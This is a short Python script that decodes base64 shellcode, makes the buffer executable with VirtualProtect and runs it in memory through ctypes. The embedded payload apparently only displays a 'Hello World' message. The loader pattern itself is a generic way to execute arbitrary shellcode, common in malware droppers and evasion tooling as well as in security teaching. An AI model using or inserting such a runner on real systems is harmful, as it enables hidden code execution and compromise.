import base64
import ctypes

kernel32 = ctypes.WinDLL('kernel32')
kernel32.VirtualAlloc.restype = ctypes.c_void_p

sc = base64.b64decode('MdKyMGSLEotSDItSHItCCItyIIsSgH4MM3XyiccDeDyLV3gBwot6IAHHMe2LNK8BxkWBPkZhdGF18oF+CEV4aXR16Yt6JAHHZossb4t6HAHHi3yv/AHHMcBQaHJsZCFobyBXb2hIZWxsieFRUP/X')
sc = ctypes.c_buffer(sc)
kernel32.VirtualProtect(sc, 0x1000, 0x40, ctypes.byref(ctypes.c_ulong()))
ctypes.cast(sc, ctypes.CFUNCTYPE(None))()
